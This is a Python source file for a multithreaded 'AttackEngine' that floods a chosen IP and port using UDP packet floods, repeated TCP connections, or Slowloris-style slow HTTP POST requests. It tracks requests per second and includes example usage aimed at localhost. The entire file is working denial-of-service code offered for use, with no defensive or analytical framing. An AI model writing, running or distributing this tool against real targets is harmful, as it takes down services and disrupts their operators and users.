import socket
import random
import threading
import time
import sys
import logging
from dataclasses import dataclass, field
from typing import Dict, List, Optional

# Logging setup for professional debugging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [%(levelname)s] %(message)s',
    handlers=[logging.StreamHandler(sys.stdout)]
)
logger = logging.getLogger("AttackEngine")

@dataclass
class AttackStats:
    """Thread-safe statistics container"""
    total_requests: int = 0
    successful: int = 0
    failed: int = 0
    start_time: float = field(default_factory=time.time)
    threads_active: int = 0
    _lock: threading.Lock = field(default_factory=threading.Lock)

    def log_success(self):
        with self._lock:
            self.total_requests += 1
            self.successful += 1

    def log_failure(self):
        with self._lock:
            self.total_requests += 1
            self.failed += 1

    @property
    def rps(self) -> float:
        duration = time.time() - self.start_time
        return self.total_requests / duration if duration > 0 else 0

class AttackEngine:
    def __init__(self, target_ip: str, target_port: int, threads: int, duration: int):
        self.target_ip = target_ip
        self.target_port = target_port
        self.thread_count = threads
        self.duration = duration
        self.stats = AttackStats()
        self._stop_event = threading.Event()
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36"
        ]

    def _get_payload(self) -> bytes:
        """Generates a randomized packet payload"""
        return random._urandom(1024)

    def _udp_worker(self):
        """High-performance UDP Flooder"""
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        payload = self._get_payload()
        
        while not self._stop_event.is_set():
            try:
                sock.sendto(payload, (self.target_ip, self.target_port))
                self.stats.log_success()
            except Exception:
                self.stats.log_failure()
        sock.close()

    def _tcp_worker(self):
        """TCP Connection Stressor"""
        while not self._stop_event.is_set():
            try:
                with socket.create_connection((self.target_ip, self.target_port), timeout=2) as s:
                    s.sendall(b"HEAD / HTTP/1.1\r\nHost: " + self.target_ip.encode() + b"\r\n\r\n")
                    self.stats.log_success()
            except Exception:
                self.stats.log_failure()

    def _slowloris_worker(self):
        """Slow HTTP Post Denial of Service"""
        sockets = []
        while not self._stop_event.is_set():
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(4)
                s.connect((self.target_ip, self.target_port))
                s.send(f"POST / HTTP/1.1\r\nHost: {self.target_ip}\r\n".encode("utf-8"))
                s.send(f"User-Agent: {random.choice(self.user_agents)}\r\n".encode("utf-8"))
                s.send("Content-Length: 42\r\n".encode("utf-8"))
                sockets.append(s)
                self.stats.log_success()
            except Exception:
                self.stats.log_failure()
                
            # Keep sockets alive with junk data
            for sock in list(sockets):
                try:
                    sock.send(f"X-a: {random.randint(1, 5000)}\r\n".encode("utf-8"))
                except Exception:
                    sockets.remove(sock)
            time.sleep(5)

    def monitor(self):
        """Real-time monitoring console"""
        print(f"\n[!] Attack started on {self.target_ip}:{self.target_port}")
        print("-" * 50)
        try:
            while not self._stop_event.is_set():
                elapsed = time.time() - self.stats.start_time
                print(f"\rStatus: RUNNING | Time: {elapsed:.1f}s | Requests: {self.stats.total_requests} | RPS: {self.stats.rps:.2f}", end="")
                if elapsed >= self.duration:
                    self._stop_event.set()
                time.sleep(0.5)
        except KeyboardInterrupt:
            self._stop_event.set()
        print("\n" + "-" * 50)

    def run(self, method: str = "udp"):
        """Main entry point to launch the engine"""
        methods = {
            "udp": self._udp_worker,
            "tcp": self._tcp_worker,
            "slowloris": self._slowloris_worker
        }
        
        worker_func = methods.get(method.lower(), self._udp_worker)
        threads: List[threading.Thread] = []

        # Launching threads
        for i in range(self.thread_count):
            t = threading.Thread(target=worker_func, daemon=True)
            t.start()
            threads.append(t)

        # Start monitoring in main thread
        self.monitor()

        # Cleanup
        logger.info("Stopping all threads...")
        for t in threads:
            t.join(timeout=1)
        logger.info(f"Final Stats - Total: {self.stats.total_requests} | Success: {self.stats.successful}")

if __name__ == "__main__":
    # Example Usage: Target, Port, Threads, Duration(sec)
    engine = AttackEngine("127.0.0.1", 80, threads=100, duration=30)
    engine.run(method="udp")
